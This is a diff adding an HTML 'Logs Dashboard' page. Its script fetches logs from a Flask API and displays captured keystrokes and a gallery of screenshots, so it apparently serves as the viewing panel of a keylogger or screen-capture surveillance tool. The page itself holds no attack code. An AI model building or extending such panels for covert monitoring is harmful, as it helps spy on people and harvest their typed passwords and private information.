@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Logs Dashboard</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 20px;
+      background: #f9f9f9;
+      color: #333;
+    }
+    h1 {
+      margin-bottom: 10px;
+    }
+    h2 {
+      margin-top: 30px;
+      border-bottom: 2px solid #ccc;
+      padding-bottom: 5px;
+    }
+    #keystrokes {
+      white-space: pre-wrap;  /* keep line breaks */
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 15px;
+      max-height: 300px;
+      overflow-y: auto;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    #images {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-top: 10px;
+    }
+    #images img {
+      max-width: 300px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      transition: transform 0.2s;
+    }
+    #images img:hover {
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+  <h1>Logs Dashboard</h1>
+
+  <h2>Keystrokes</h2>
+  <div id="keystrokes">(Loading...)</div>
+
+  <h2>Screenshots</h2>
+  <div id="images"><p>(Loading...)</p></div>
+
+  <script>
+    async function loadLogs() {
+      try {
+        const res = await fetch('/api/logs'); // Flask API (auth required)
+        if (!res.ok) {
+          document.body.innerHTML = "<p>Failed to load logs (check authentication).</p>";
+          return;
+        }
+        const data = await res.json();
+
+        // Show keystrokes
+        const keyBox = document.getElementById('keystrokes');
+        keyBox.textContent = data.keystrokes || "(No keystrokes yet)";
+
+        // Show images
+        const imgDiv = document.getElementById('images');
+        imgDiv.innerHTML = "";
+        if (data.images.length === 0) {
+          imgDiv.innerHTML = "<p>(No images yet)</p>";
+        } else {
+          data.images.forEach(src => {
+            const img = document.createElement('img');
+            img.src = src;   // served from /data/<filename>
+            img.alt = "Screenshot";
+            imgDiv.appendChild(img);
+          });
+        }
+      } catch (err) {
+        document.body.innerHTML = "<p>Error loading logs.</p>";
+        console.error(err);
+      }
+    }
+
+    loadLogs();
+  </script>
+</body>
+</html>
